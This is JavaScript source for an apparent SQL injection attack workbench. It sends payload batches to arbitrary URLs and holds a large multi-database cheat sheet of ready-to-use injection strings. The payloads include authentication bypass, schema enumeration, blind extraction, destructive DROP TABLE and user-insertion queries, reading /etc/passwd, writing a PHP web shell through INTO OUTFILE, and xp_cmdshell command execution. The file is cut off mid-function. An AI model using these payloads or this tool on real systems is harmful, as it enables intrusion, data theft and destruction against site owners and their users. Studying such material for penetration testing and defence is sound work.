
    /**
     * SQLi Workbench v2
     * - History: delete, rename, pin, drag-reorder
     * - Enhanced multi-DB Cheat Sheet
     * - Collapsible panels (Cheat Sheet, History, Payload)
     */

    // ===== State =====
    const state = {
      history: [],
      activeHistoryId: null,
      nextId: 1,
      headers: [
        { key: 'User-Agent', value: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36' },
        { key: 'Cookie', value: '' },
      ],
      selectedBatchIds: [],
      collapsedBatches: {},
      isSending: false,
      dragId: null,
      lastRenderedHtml: '',
      historySearch: '',
      historyStatusFilter: 'all',
      historySort: { key: 'time', dir: 'desc' },
      openDetailId: null,
      nightProtect: true,       // derived: mode > 0
      nightProtectMode: 1,      // 0=off, 1=soft, 2=strict
      _npLastClick: 0,
      recording: false,
      endpoints: [], // { key, path, origin, paramNames[], sampleUrl, method, count }
      // Saved attack sources by batchId
      attackSources: {},
      // Attack mode
      attack: {
        active: false,
        paused: false,
        stop: false,
        total: 0,
        done: 0,
        batchId: null,
        payloads: [],
      },
    };

    // ===== DOM =====
    const $ = (s) => document.querySelector(s);
    const $$ = (s) => document.querySelectorAll(s);

    const methodSelect = $('#methodSelect');
    const urlInput = $('#urlInput');
    const sendBtn = $('#sendBtn');
    const urlProgressBar = $('#urlProgressBar');
    const pauseBtn = $('#pauseBtn');
    const stopBtn = $('#stopBtn');
    const attackProgressLabel = $('#attackProgressLabel');
    const toggleHeadersBtn = $('#toggleHeadersBtn');
    const headersPanel = $('#headersPanel');
    const headersList = $('#headersList');
    const addHeaderBtn = $('#addHeaderBtn');
    const clearHeadersBtn = $('#clearHeadersBtn');
    const payloadInput = $('#payloadInput');
    const urlEncodeBtn = $('#urlEncodeBtn');
    const urlDecodeBtn = $('#urlDecodeBtn');
    const clearPayloadBtn = $('#clearPayloadBtn');
    const injectBtn = $('#injectBtn');
    const postBodySection = $('#postBodySection');
    const postBodyInput = $('#postBodyInput');
    const injectIntoBodyBtn = $('#injectIntoBodyBtn');
    const clearBodyBtn = $('#clearBodyBtn');
    const historyList = $('#historyList');
    const clearHistoryBtn = $('#clearHistoryBtn');
    const cheatSheetBody = $('#cheatSheetBody');
    const toastEl = $('#toast');
    const renderedFrame = $('#rendered-frame');
    const renderedPlaceholder = $('#renderedPlaceholder');
    const rawResponse = $('#rawResponse');
    const metaTableWrap = $('#metaTableWrap');

    // ===== Enhanced Cheat Sheet (Multi-DB knowledge base) =====
    // View model: home (pins + global search + DB list) → db (local search + functions) → detail overlay
    const CHEAT_PINS_KEY = 'sqli-workbench-cheat-pins';
    const cheatNav = { view: 'home', dbId: null, q: '', detailId: null };

    const CHEAT_DBS = [
      {
        id: 'generic',
        name: 'Generic',
        tag: 'generic',
        blurb: 'DB-agnostic auth bypass, boolean probes, stacked basics',
        categories: [
          {
            title: 'Authentication Bypass',
            items: [
              { id: 'gen-or-1', name: "' OR '1'='1", summary: 'Classic string OR true', description: 'Closes a string context and forces the WHERE clause to evaluate true for all rows. Works on many string-based login filters.', example: "username = admin' OR '1'='1' -- & password = x", payloads: ["' OR '1'='1", "' OR '1'='1' --", "' OR '1'='1' /*"], tags: ['auth', 'bypass'] },
              { id: 'gen-or-num', name: "' OR 1=1 --", summary: 'Numeric-style true condition', description: 'Boolean true via 1=1. Prefer comment style matching the backend (space+--, #, /*).', example: "id=1' OR 1=1-- -", payloads: ["' OR 1=1-- -", "' OR 1=1#", "') OR (1=1)-- -"], tags: ['auth', 'bypass'] },
              { id: 'gen-admin-comment', name: "admin' --", summary: 'Close user + comment out password check', description: 'Injects username admin and comments the rest of the SQL so the password predicate is ignored (if query is built by concatenation).', example: "user=admin' --&pass=anything", payloads: ["admin' --", "admin' #", "admin'/*"], tags: ['auth'] },
              { id: 'gen-or-char', name: "' OR 'a'='a", summary: 'Char equality true', description: 'Same idea as 1=1 using character comparison — useful when numeric forms are filtered.', example: "' OR 'a'='a' --", payloads: ["' OR 'a'='a", "' OR 'a'='a'-- -"], tags: ['auth', 'bypass'] },
            ],
          },
          {
            title: 'Boolean probes',
            items: [
              { id: 'gen-true', name: 'AND 1=1', summary: 'Baseline true', description: 'Should keep page behavior similar to a normal valid condition — use as baseline before 1=2.', example: "AND 1=1-- -", payloads: ["AND 1=1-- -", "AND 'a'='a'-- -"], tags: ['boolean'] },
              { id: 'gen-false', name: 'AND 1=2', summary: 'Baseline false', description: 'Should change content/length vs 1=1 if the injection point is evaluated.', example: "AND 1=2-- -", payloads: ["AND 1=2-- -", "AND 'a'='b'-- -"], tags: ['boolean'] },
            ],
          },
          {
            title: 'Stacked / destructive samples',
            items: [
              { id: 'gen-stack-drop', name: '; DROP TABLE …', summary: 'Stacked destructive (lab only)', description: 'Only works if stacked queries are allowed. Never run against systems you do not own.', example: "; DROP TABLE users--", payloads: ["; DROP TABLE users--", "; INSERT INTO users VALUES('hacker','pass')--"], tags: ['stacked', 'lab'] },
            ],
          },
        ],
      },
      {
        id: 'mysql',
        name: 'MySQL',
        tag: 'mysql',
        blurb: 'version/database, information_schema, SLEEP, EXTRACTVALUE, GROUP_CONCAT',
        categories: [
          {
            title: 'Info & identity',
            items: [
              { id: 'my-version', name: 'version() / @@version', summary: 'Server version', description: 'Returns MySQL version string. Useful early fingerprint after confirming SQLi.', example: "SELECT version();", payloads: ["UNION SELECT 1,version(),3-- -", "UNION SELECT 1,@@version,3-- -", "AND EXTRACTVALUE(1,CONCAT(0x7e,version()))"], tags: ['info', 'enum'] },
              { id: 'my-database', name: 'database()', summary: 'Current schema name', description: 'Name of the default database for the connection.', example: "SELECT database();", payloads: ["UNION SELECT 1,database(),3-- -", "AND LENGTH(database())>1-- -"], tags: ['info', 'enum'] },
              { id: 'my-user', name: 'user() / current_user()', summary: 'DB user', description: 'user() may include client host; current_user() is the authenticated account.', example: "SELECT user(), current_user();", payloads: ["UNION SELECT 1,user(),3-- -", "UNION SELECT 1,current_user(),3-- -"], tags: ['info'] },
              { id: 'my-schema', name: 'schema()', summary: 'Alias of database()', description: 'Synonym for database() in MySQL.', example: "SELECT schema();", payloads: ["UNION SELECT 1,schema(),3-- -"], tags: ['info'] },
            ],
          },
          {
            title: 'String & helpers',
            items: [
              { id: 'my-concat', name: 'CONCAT / CONCAT_WS', summary: 'Join strings', description: 'CONCAT returns NULL if any arg is NULL; CONCAT_WS skips NULL separators.', example: "CONCAT(user(),0x3a,database())", payloads: ["UNION SELECT 1,CONCAT(user(),0x3a,database()),3-- -", "UNION SELECT 1,CONCAT_WS(0x3a,user(),database()),3-- -"], tags: ['string'] },
              { id: 'my-group-concat', name: 'GROUP_CONCAT', summary: 'Aggregate many rows to one cell', description: 'Critical for UNION when you need multiple table/column names in one column. Raise group_concat_max_len if truncated.', example: "GROUP_CONCAT(table_name SEPARATOR ',')", payloads: ["UNION SELECT 1,GROUP_CONCAT(table_name),3 FROM information_schema.tables WHERE table_schema=database()-- -", "UNION SELECT 1,GROUP_CONCAT(column_name),3 FROM information_schema.columns WHERE table_name='users'-- -"], tags: ['enum', 'string'] },
              { id: 'my-substr', name: 'SUBSTRING / SUBSTR / MID', summary: 'Slice strings (blind)', description: 'Extract one character at a time for boolean/time blind extraction.', example: "SUBSTRING(database(),1,1)='a'", payloads: ["AND SUBSTRING(database(),1,1)='a'-- -", "AND MID(VERSION(),1,1)='5'-- -"], tags: ['blind', 'string'] },
              { id: 'my-ascii', name: 'ASCII / ORD', summary: 'Char code for binary search', description: 'Combine with SUBSTRING for efficient blind extraction via binary search on ASCII codes.', example: "ASCII(SUBSTRING(database(),1,1))>97", payloads: ["AND ASCII(SUBSTRING(database(),1,1))>97-- -"], tags: ['blind'] },
              { id: 'my-length', name: 'LENGTH / CHAR_LENGTH', summary: 'String length', description: 'LENGTH is bytes; CHAR_LENGTH is characters — differ for multi-byte sets.', example: "LENGTH(database())", payloads: ["AND LENGTH(database())>3-- -"], tags: ['blind'] },
              { id: 'my-if', name: 'IF(cond,a,b)', summary: 'Inline conditional', description: 'Handy for time-based: sleep only when condition is true.', example: "IF(1=1,SLEEP(5),0)", payloads: ["AND IF(1=1,SLEEP(5),0)-- -", "AND IF(SUBSTRING(database(),1,1)='a',SLEEP(3),0)-- -"], tags: ['time', 'logic'] },
            ],
          },
          {
            title: 'Schema enumeration',
            items: [
              { id: 'my-tables', name: 'information_schema.tables', summary: 'List tables', description: 'Filter table_schema=database() for current DB tables.', example: "SELECT table_name FROM information_schema.tables WHERE table_schema=database()", payloads: ["UNION SELECT 1,table_name,3 FROM information_schema.tables WHERE table_schema=database()-- -", "UNION SELECT 1,GROUP_CONCAT(table_name),3 FROM information_schema.tables WHERE table_schema=database()-- -"], tags: ['enum'] },
              { id: 'my-columns', name: 'information_schema.columns', summary: 'List columns', description: 'Enumerate columns for a known table_name.', example: "SELECT column_name FROM information_schema.columns WHERE table_name='users'", payloads: ["UNION SELECT 1,column_name,3 FROM information_schema.columns WHERE table_name='users'-- -", "UNION SELECT 1,GROUP_CONCAT(column_name),3 FROM information_schema.columns WHERE table_name='users'-- -"], tags: ['enum'] },
              { id: 'my-schemata', name: 'information_schema.schemata', summary: 'List databases', description: 'All schemas visible to the current user.', example: "SELECT schema_name FROM information_schema.schemata", payloads: ["UNION SELECT 1,schema_name,3 FROM information_schema.schemata-- -"], tags: ['enum'] },
            ],
          },
          {
            title: 'UNION / ORDER BY',
            items: [
              { id: 'my-orderby', name: 'ORDER BY n', summary: 'Find column count', description: 'Increase n until error — last success is column count.', example: "ORDER BY 1-- - … ORDER BY 10-- -", payloads: ["ORDER BY 1-- -", "ORDER BY 5-- -", "ORDER BY 10-- -"], tags: ['union'] },
              { id: 'my-union', name: 'UNION SELECT', summary: 'Stack result sets', description: 'Match column count; use NULL or integers then replace reflection columns with functions.', example: "UNION SELECT 1,2,3-- -", payloads: ["UNION SELECT NULL-- -", "UNION SELECT 1,2,3-- -", "UNION SELECT 1,2,database()-- -"], tags: ['union'] },
            ],
          },
          {
            title: 'Error-based',
            items: [
              { id: 'my-extractvalue', name: 'EXTRACTVALUE', summary: 'XPath error leak', description: 'Forces XPath error embedding query result in the message (when errors displayed).', example: "EXTRACTVALUE(1, CONCAT(0x7e,(SELECT version()),0x7e))", payloads: ["AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()),0x7e))", "AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT database()),0x7e))"], tags: ['error'] },
              { id: 'my-updatexml', name: 'UPDATEXML', summary: 'XML error leak', description: 'Similar to EXTRACTVALUE via UPDATEXML error channel.', example: "UPDATEXML(1,CONCAT(0x7e,(SELECT database()),0x7e),1)", payloads: ["AND UPDATEXML(1,CONCAT(0x7e,(SELECT database()),0x7e),1)"], tags: ['error'] },
              { id: 'my-dup-error', name: 'FLOOR rand error', summary: 'Duplicate key error leak', description: 'Classic COUNT/FLOOR(RAND(0)*2) double-query error technique.', example: "(SELECT COUNT(*),CONCAT((SELECT database()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)", payloads: ["AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT database()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)"], tags: ['error'] },
            ],
          },
          {
            title: 'Time-based blind',
            items: [
              { id: 'my-sleep', name: 'SLEEP(n)', summary: 'Delay n seconds', description: 'Primary time sink. Measure RTT delta vs baseline.', example: "SLEEP(5)", payloads: ["AND SLEEP(5)-- -", "AND (SELECT * FROM (SELECT(SLEEP(5)))a)-- -", "; SELECT SLEEP(5)-- -"], tags: ['time'] },
              { id: 'my-benchmark', name: 'BENCHMARK', summary: 'CPU burn delay', description: 'Alternative when SLEEP is filtered; noisier on CPU.', example: "BENCHMARK(10000000,SHA1('test'))", payloads: ["AND BENCHMARK(10000000,SHA1('a'))-- -"], tags: ['time'] },
            ],
          },
          {
            title: 'File / dangerous (lab)',
            items: [
              { id: 'my-load-file', name: 'LOAD_FILE', summary: 'Read server file', description: 'Requires FILE privilege and secure_file_priv constraints.', example: "LOAD_FILE('/etc/passwd')", payloads: ["UNION SELECT 1,LOAD_FILE('/etc/passwd'),3-- -"], tags: ['file', 'lab'] },
              { id: 'my-into-outfile', name: 'INTO OUTFILE', summary: 'Write web shell (lab)', description: 'Needs FILE privilege + writable path. Lab-only technique.', example: "SELECT '<?php system($_GET[c]);?>' INTO OUTFILE '/var/www/html/s.php'", payloads: ["' UNION SELECT '<?php system($_GET[c]);?>' INTO OUTFILE '/tmp/shell.php'-- -"], tags: ['file', 'lab'] },
            ],
          },
        ],
      },
      {
        id: 'mssql',
        name: 'MSSQL',
        tag: 'mssql',
        blurb: '@@version, db_name, sysobjects, WAITFOR, CONVERT errors',
        categories: [
          {
            title: 'Info & identity',
            items: [
              { id: 'ms-version', name: '@@version', summary: 'SQL Server version banner', description: 'Long banner with build and OS hints.', example: "SELECT @@version", payloads: ["UNION SELECT 1,@@version,3--", "AND 1=CONVERT(int,@@version)--"], tags: ['info'] },
              { id: 'ms-db', name: 'db_name() / DB_NAME()', summary: 'Current database', description: 'Name of the active database.', example: "SELECT db_name()", payloads: ["UNION SELECT 1,db_name(),3--"], tags: ['info'] },
              { id: 'ms-user', name: 'system_user / user_name()', summary: 'Login / user', description: 'system_user is login; user_name() is database user.', example: "SELECT system_user, user_name()", payloads: ["UNION SELECT 1,system_user,3--", "UNION SELECT 1,user_name(),3--"], tags: ['info'] },
              { id: 'ms-servername', name: '@@servername', summary: 'Instance name', description: 'SQL Server instance network name.', example: "SELECT @@servername", payloads: ["UNION SELECT 1,@@servername,3--"], tags: ['info'] },
            ],
          },
          {
            title: 'Schema enumeration',
            items: [
              { id: 'ms-tables', name: 'sysobjects / sys.tables', summary: 'List user tables', description: "xtype='U' filters user tables in older catalog views.", example: "SELECT name FROM sysobjects WHERE xtype='U'", payloads: ["UNION SELECT 1,name,3 FROM sysobjects WHERE xtype='U'--", "UNION SELECT 1,name,3 FROM sys.tables--"], tags: ['enum'] },
              { id: 'ms-columns', name: 'syscolumns / information_schema', summary: 'List columns', description: 'Resolve table id then column names, or use information_schema.columns.', example: "SELECT name FROM syscolumns WHERE id=(SELECT id FROM sysobjects WHERE name='users')", payloads: ["UNION SELECT 1,name,3 FROM syscolumns WHERE id=(SELECT id FROM sysobjects WHERE name='users')--", "UNION SELECT 1,column_name,3 FROM information_schema.columns WHERE table_name='users'--"], tags: ['enum'] },
            ],
          },
          {
            title: 'UNION / TOP',
            items: [
              { id: 'ms-orderby', name: 'ORDER BY n', summary: 'Column count', description: 'Same methodology as other engines; comment with --', example: "ORDER BY 1--", payloads: ["ORDER BY 1--", "ORDER BY 10--"], tags: ['union'] },
              { id: 'ms-union', name: 'UNION SELECT', summary: 'Union injection', description: 'Match types/count; MSSQL often needs same types across arms.', example: "UNION SELECT 1,2,3--", payloads: ["UNION SELECT NULL--", "UNION SELECT 1,2,3--", "UNION SELECT 1,@@version,3--"], tags: ['union'] },
            ],
          },
          {
            title: 'Error / time / stacked',
            items: [
              { id: 'ms-convert', name: 'CONVERT / CAST errors', summary: 'Type conversion leak', description: 'Force conversion of a subquery string to int to surface data in error.', example: "CONVERT(int,(SELECT @@version))", payloads: ["' AND 1=CONVERT(int,(SELECT @@version))--", "AND 1=CAST((SELECT db_name()) AS int)--"], tags: ['error'] },
              { id: 'ms-waitfor', name: "WAITFOR DELAY", summary: 'Time delay', description: "Standard MSSQL time-based sink.", example: "WAITFOR DELAY '0:0:5'", payloads: ["AND WAITFOR DELAY '0:0:5'--", "; WAITFOR DELAY '0:0:5'--"], tags: ['time'] },
              { id: 'ms-stacked', name: 'Stacked queries', summary: 'Multiple statements', description: 'MSSQL frequently allows stacked queries depending on driver (e.g. some PHP/Python stacks).', example: "; WAITFOR DELAY '0:0:5'--", payloads: ["; WAITFOR DELAY '0:0:5'--", "; SELECT 1--"], tags: ['stacked'] },
            ],
          },
          {
            title: 'xp_cmdshell (lab)',
            items: [
              { id: 'ms-xpcmd', name: 'xp_cmdshell', summary: 'OS command (if enabled)', description: 'Requires sysadmin and xp_cmdshell enabled. Lab-only.', example: "EXEC xp_cmdshell 'whoami'", payloads: ["; EXEC xp_cmdshell 'whoami'--"], tags: ['os', 'lab'] },
            ],
          },
        ],
      },
      {
        id: 'pgsql',
        name: 'PostgreSQL',
        tag: 'pgsql',
        blurb: 'version(), current_database, pg_sleep, information_schema, UDF notes',
        categories: [
          {
            title: 'Info & identity',
            items: [
              { id: 'pg-version', name: 'version()', summary: 'PostgreSQL version', description: 'Full version string of the server.', example: "SELECT version();", payloads: ["UNION SELECT 1,version(),3-- -", "AND 1=CAST(version() AS int)-- -"], tags: ['info'] },
              { id: 'pg-db', name: 'current_database()', summary: 'Current DB', description: 'Name of the database in use.', example: "SELECT current_database();", payloads: ["UNION SELECT 1,current_database(),3-- -"], tags: ['info'] },
              { id: 'pg-user', name: 'current_user / user / session_user', summary: 'Role names', description: 'current_user is active role; session_user is session login role.', example: "SELECT current_user, session_user;", payloads: ["UNION SELECT 1,current_user,3-- -", "UNION SELECT 1,session_user,3-- -"], tags: ['info'] },
            ],
          },
          {
            title: 'String / blind helpers',
            items: [
              { id: 'pg-substr', name: 'SUBSTR / SUBSTRING', summary: 'Slice for blind', description: '1-based indexing for character extraction.', example: "SUBSTR(version(),1,1)='P'", payloads: ["AND SUBSTR((SELECT version()),1,1)='P'-- -", "AND SUBSTRING(current_database(),1,1)='a'-- -"], tags: ['blind', 'string'] },
              { id: 'pg-length', name: 'LENGTH', summary: 'String length', description: 'Character length of text.', example: "LENGTH(current_database())", payloads: ["AND LENGTH(current_database())>1-- -"], tags: ['blind'] },
              { id: 'pg-ascii', name: 'ASCII', summary: 'Codepoint', description: 'ASCII code of first character of string.', example: "ASCII(SUBSTR(current_database(),1,1))", payloads: ["AND ASCII(SUBSTR(current_database(),1,1))>97-- -"], tags: ['blind'] },
            ],
          },
          {
            title: 'Schema enumeration',
            items: [
              { id: 'pg-tables', name: 'pg_tables / information_schema', summary: 'List tables', description: 'pg_tables is concise; information_schema is portable.', example: "SELECT tablename FROM pg_tables WHERE schemaname='public'", payloads: ["UNION SELECT 1,tablename,3 FROM pg_tables-- -", "UNION SELECT 1,table_name,3 FROM information_schema.tables-- -"], tags: ['enum'] },
              { id: 'pg-columns', name: 'information_schema.columns', summary: 'List columns', description: 'Filter by table_name for target table.', example: "SELECT column_name FROM information_schema.columns WHERE table_name='users'", payloads: ["UNION SELECT 1,column_name,3 FROM information_schema.columns WHERE table_name='users'-- -"], tags: ['enum'] },
            ],
          },
          {
            title: 'UNION / time / error',
            items: [
              { id: 'pg-union', name: 'UNION SELECT', summary: 'Union injection', description: 'Match column count; types must align or cast explicitly.', example: "UNION SELECT 1,2,3-- -", payloads: ["ORDER BY 1-- -", "UNION SELECT NULL-- -", "UNION SELECT 1,version(),3-- -"], tags: ['union'] },
              { id: 'pg-sleep', name: 'pg_sleep', summary: 'Time delay', description: 'Primary time-based function in PostgreSQL.', example: "SELECT pg_sleep(5);", payloads: ["AND pg_sleep(5)-- -", "AND 1=(SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE 0 END)-- -"], tags: ['time'] },
              { id: 'pg-cast', name: 'CAST errors', summary: 'Error-based leak', description: 'Cast a string query result to int to trigger verbose errors when shown.', example: "CAST((SELECT version()) AS int)", payloads: ["AND 1=CAST((SELECT version()) AS int)-- -"], tags: ['error'] },
            ],
          },
        ],
      },
      {
        id: 'oracle',
        name: 'Oracle',
        tag: 'oracle',
        blurb: 'dual, v$version, all_tables, DBMS_PIPE, SUBSTR',
        categories: [
          {
            title: 'Info & dual',
            items: [
              { id: 'or-dual', name: 'FROM dual', summary: 'Dummy table required', description: 'Many Oracle SELECTs need FROM dual when no real table is referenced.', example: "SELECT 1 FROM dual", payloads: ["UNION SELECT NULL FROM dual--", "UNION SELECT 1,2,3 FROM dual--"], tags: ['union', 'info'] },
              { id: 'or-version', name: 'v$version / banner', summary: 'Version banner', description: 'Query v$version for product banner lines.', example: "SELECT banner FROM v$version", payloads: ["UNION SELECT 1,banner,3 FROM v$version--"], tags: ['info'] },
              { id: 'or-user', name: 'USER', summary: 'Current schema user', description: 'Returns the name of the session user.', example: "SELECT USER FROM dual", payloads: ["UNION SELECT 1,USER,3 FROM dual--"], tags: ['info'] },
            ],
          },
          {
            title: 'Schema enumeration',
            items: [
              { id: 'or-tables', name: 'all_tables / user_tables', summary: 'List tables', description: 'all_tables includes accessible tables; user_tables is owned tables.', example: "SELECT table_name FROM all_tables", payloads: ["UNION SELECT 1,table_name,3 FROM all_tables--", "UNION SELECT 1,table_name,3 FROM user_tables--"], tags: ['enum'] },
              { id: 'or-columns', name: 'all_tab_columns', summary: 'List columns', description: 'Oracle often stores table names uppercase unless quoted identifiers.', example: "SELECT column_name FROM all_tab_columns WHERE table_name='USERS'", payloads: ["UNION SELECT 1,column_name,3 FROM all_tab_columns WHERE table_name='USERS'--"], tags: ['enum'] },
            ],
          },
          {
            title: 'String / time',
            items: [
              { id: 'or-substr', name: 'SUBSTR', summary: 'Blind extraction', description: 'Character extraction for boolean blind.', example: "SUBSTR(USER,1,1)='S'", payloads: ["AND SUBSTR(USER,1,1)='S'--"], tags: ['blind', 'string'] },
              { id: 'or-pipe', name: 'DBMS_PIPE.RECEIVE_MESSAGE', summary: 'Time delay', description: 'Common Oracle time-based technique via pipe wait.', example: "DBMS_PIPE.RECEIVE_MESSAGE(('a'),5)", payloads: ["AND DBMS_PIPE.RECEIVE_MESSAGE(('a'),5)--"], tags: ['time'] },
            ],
          },
        ],
      },
      {
        id: 'sqlite',
        name: 'SQLite',
        tag: 'sqlite',
        blurb: 'sqlite_master, sql schema, RANDOMBLOB delay tricks',
        categories: [
          {
            title: 'Catalog',
            items: [
              { id: 'sq-master', name: 'sqlite_master', summary: 'Schema catalog', description: 'Tables, views, and the SQL used to create them.', example: "SELECT sql FROM sqlite_master WHERE type='table'", payloads: ["' UNION SELECT sql,2,3 FROM sqlite_master--", "' UNION SELECT name,2,3 FROM sqlite_master WHERE type='table'--"], tags: ['enum'] },
              { id: 'sq-union', name: 'UNION SELECT', summary: 'Union basics', description: 'Match column count; SQLite is flexible with types.', example: "' UNION SELECT 1,2,3--", payloads: ["' UNION SELECT 1,2,3--", "' UNION SELECT sql,2,3 FROM sqlite_master--"], tags: ['union'] },
            ],
          },
          {
            title: 'Time-ish / heavy',
            items: [
              { id: 'sq-randomblob', name: 'RANDOMBLOB heavy LIKE', summary: 'CPU/time approximation', description: 'Abuses large blob generation + LIKE for delay when no SLEEP exists.', example: "LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))", payloads: ["' AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))--"], tags: ['time'] },
            ],
          },
        ],
      },
    ];

    function loadCheatPins() {
      try {
        const raw = localStorage.getItem(CHEAT_PINS_KEY);
        const arr = raw ? JSON.parse(raw) : [];
        return Array.isArray(arr) ? arr : [];
      } catch { return []; }
    }
    function saveCheatPins(ids) {
      try { localStorage.setItem(CHEAT_PINS_KEY, JSON.stringify(ids || [])); } catch {}
    }
    function isCheatPinned(id) {
      return loadCheatPins().includes(id);
    }
    function toggleCheatPin(id) {
      const pins = loadCheatPins();
      const i = pins.indexOf(id);
      if (i >= 0) pins.splice(i, 1);
      else pins.unshift(id);
      saveCheatPins(pins);
      return pins.includes(id);
    }

    function findCheatItem(id) {
      for (const db of CHEAT_DBS) {
        for (const cat of db.categories) {
          for (const item of cat.items) {
            if (item.id === id) return { db, cat, item };
          }
        }
      }
      return null;
    }

    function allCheatItems() {
      const out = [];
      for (const db of CHEAT_DBS) {
        for (const cat of db.categories) {
          for (const item of cat.items) {
            out.push({ db, cat, item });
          }
        }
      }
      return out;
    }

    function cheatMatchesQuery(ref, q) {
      if (!q) return true;
      const blob = [
        ref.item.name, ref.item.summary, ref.item.description || '',
        ref.item.example || '', (ref.item.payloads || []).join(' '),
        (ref.item.tags || []).join(' '), ref.cat.title, ref.db.name,
      ].join(' ').toLowerCase();
      return q.toLowerCase().split(/\s+/).filter(Boolean).every((w) => blob.includes(w));
    }

    // ===== Cheat Sheet (multi-view) =====
    function insertCheatPayload(text) {
      if (!payloadInput) return;
      const cur = payloadInput.value || '';
      payloadInput.value = cur && !cur.endsWith('\n') ? (cur + '\n' + text) : (cur + text);
      if (typeof updatePayloadSummary === 'function') updatePayloadSummary();
      if (typeof refreshAttackPanel === 'function') refreshAttackPanel();
      openVPanel('payload');
      showToast('Payload inserted', 'success');
    }

    function renderCheatSheet() {
      if (!cheatSheetBody) return;
      // default to home each explicit open unless we only re-render detail
      if (!cheatNav._ready) {
        cheatNav.view = 'home';
        cheatNav.dbId = null;
        cheatNav.q = '';
        cheatNav.detailId = null;
        cheatNav._ready = true;
      }
      paintCheatSheet();
    }

    function paintCheatSheet() {
      if (!cheatSheetBody) return;
      if (cheatNav.view === 'db' && cheatNav.dbId) paintCheatDbView();
      else paintCheatHomeView();
      if (cheatNav.detailId) paintCheatDetail(cheatNav.detailId);
      else {
        const ov = $('#cheatDetailOverlay');
        if (ov) ov.classList.add('hidden');
      }
    }

    function paintCheatHomeView() {
      const pins = loadCheatPins();
      const pinnedRefs = pins.map(findCheatItem).filter(Boolean);
      const q = cheatNav.q || '';
      const globalHits = q ? allCheatItems().filter((r) => cheatMatchesQuery(r, q)).slice(0, 80) : [];

      cheatSheetBody.innerHTML = `
        <div class="cheat-view cheat-home">
          <div class="cheat-search-row">
            <input type="search" class="cheat-search" id="cheatGlobalSearch" placeholder="Global search across all databases…" value="${escapeHtml(q)}" spellcheck="false" />
          </div>
          <div class="cheat-section">
            <div class="cheat-section-title">Pinned <span class="cheat-count">${pinnedRefs.length}</span></div>
            <div class="cheat-pin-list" id="cheatPinList">
              ${pinnedRefs.length ? pinnedRefs.map((r) => cheatItemRow(r, true)).join('') : '<div class="cheat-empty">No pins yet — open any function and pin it.</div>'}
            </div>
          </div>
          ${q ? `
          <div class="cheat-section">
            <div class="cheat-section-title">Search results <span class="cheat-count">${globalHits.length}</span></div>
            <div class="cheat-item-list">
              ${globalHits.length ? globalHits.map((r) => cheatItemRow(r, true)).join('') : '<div class="cheat-empty">No matches.</div>'}
            </div>
          </div>` : `
          <div class="cheat-section">
            <div class="cheat-section-title">Databases</div>
            <div class="cheat-db-grid">
              ${CHEAT_DBS.map((db) => {
                const n = db.categories.reduce((a, c) => a + c.items.length, 0);
                return `<button type="button" class="cheat-db-card tag-${db.tag}" data-db="${db.id}">
                  <strong>${escapeHtml(db.name)}</strong>
                  <small>${escapeHtml(db.blurb)}</small>
                  <span class="cheat-count">${n} entries</span>
                </button>`;
              }).join('')}
            </div>
          </div>`}
        </div>
        <div class="cheat-detail-overlay hidden" id="cheatDetailOverlay"></div>`;

      bindCheatHomeEvents();
    }

    function paintCheatDbView() {
      const db = CHEAT_DBS.find((d) => d.id === cheatNav.dbId);
      if (!db) { cheatNav.view = 'home'; paintCheatHomeView(); return; }
      const q = cheatNav.q || '';
      const cats = db.categories.map((cat) => {
        const items = cat.items.filter((item) => cheatMatchesQuery({ db, cat, item }, q));
        if (!items.length) return '';
        return `<div class="cheat-category">
          <div class="cheat-category-title"><span class="chevron">▼</span> ${escapeHtml(cat.title)} <span class="cheat-count">${items.length}</span></div>
          <div class="cheat-items">
            ${items.map((item) => cheatItemRow({ db, cat, item }, false)).join('')}
          </div>
        </div>`;
      }).join('');

      cheatSheetBody.innerHTML = `
        <div class="cheat-view cheat-db-view">
          <div class="cheat-nav-row">
            <button type="button" class="btn btn-sm btn-ghost" id="cheatBackHome">← All DBs</button>
            <span class="cheat-db-tag tag-${db.tag}">${escapeHtml(db.name)}</span>
          </div>
          <div class="cheat-search-row">
            <input type="search" class="cheat-search" id="cheatDbSearch" placeholder="Search in ${escapeHtml(db.name)}…" value="${escapeHtml(q)}" spellcheck="false" />
          </div>
          <div class="cheat-item-list">${cats || '<div class="cheat-empty">No matches in this database.</div>'}</div>
        </div>
        <div class="cheat-detail-overlay hidden" id="cheatDetailOverlay"></div>`;

      const back = $('#cheatBackHome');
      if (back) back.addEventListener('click', () => {
        cheatNav.view = 'home';
        cheatNav.dbId = null;
        cheatNav.q = '';
        cheatNav.detailId = null;
        paintCheatSheet();
      });
      const search = $('#cheatDbSearch');
      if (search) {
        search.addEventListener('input', () => {
          cheatNav.q = search.value;
          paintCheatDbView();
          const again = $('#cheatDbSearch');
          if (again) { again.focus(); again.setSelectionRange(again.value.length, again.value.length); }
        });
      }
      cheatSheetBody.querySelectorAll('.cheat-category-title').forEach((el) => {
        el.addEventListener('click', () => el.parentElement.classList.toggle('collapsed'));
      });
      bindCheatItemClicks();
    }

    function cheatItemRow(ref, showDb) {
      const { db, item } = ref;
      const pinned = isCheatPinned(item.id);
      return `<div class="cheat-entry${pinned ? ' is-pinned' : ''}" data-id="${escapeHtml(item.id)}">
        <div class="cheat-entry-main">
          ${showDb ? `<span class="cheat-db-tag tag-${db.tag}">${escapeHtml(db.name)}</span>` : ''}
          <code class="cheat-entry-name">${escapeHtml(item.name)}</code>
          <span class="cheat-entry-sum">${escapeHtml(item.summary || '')}</span>
        </div>
        <button type="button" class="cheat-pin-mini${pinned ? ' on' : ''}" data-pin="${escapeHtml(item.id)}" title="Pin">${pinned ? 'Pinned' : 'Pin'}</button>
      </div>`;
    }

    function bindCheatHomeEvents() {
      const search = $('#cheatGlobalSearch');
      if (search) {
        search.addEventListener('input', () => {
          cheatNav.q = search.value;
          paintCheatHomeView();
          const again = $('#cheatGlobalSearch');
          if (again) { again.focus(); again.setSelectionRange(again.value.length, again.value.length); }
        });
      }
